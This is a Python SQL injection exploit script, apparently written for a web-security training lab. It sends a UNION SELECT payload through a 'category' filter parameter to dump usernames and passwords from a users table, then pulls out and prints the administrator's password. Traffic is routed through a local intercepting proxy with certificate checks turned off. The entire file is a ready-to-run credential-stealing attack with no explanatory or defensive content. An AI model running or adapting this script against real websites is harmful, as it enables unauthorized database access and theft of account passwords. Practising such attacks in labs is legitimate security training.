import requests
import urllib3
import sys
import re 

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}
def exploit_sqli(url):
    path = "filter?category=Gifts"
    sqli_payload = "'+UNION+SELECT+NULL,username+||+'~'+||+password+FROM+users--"
    req = requests.get(url+path+sqli_payload, verify=False,proxies=proxies)
    res = req.text

    match = re.search(r'<th>administrator~([a-zA-Z0-9]+)</th>', res)
    if match:
        admin_password = match.group(1)
        return admin_password
    # if "administrator" in res:
    #     return res.split('~')
    return False

if __name__=='__main__':
    try:
        url = sys.argv[1]
    except:
        print("[-] Usage:%s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com"% sys.argv[0])

    password = exploit_sqli(url)
    if password:

        print("[+] Finding username and password ..")
        print("Admin password is %s" %password)
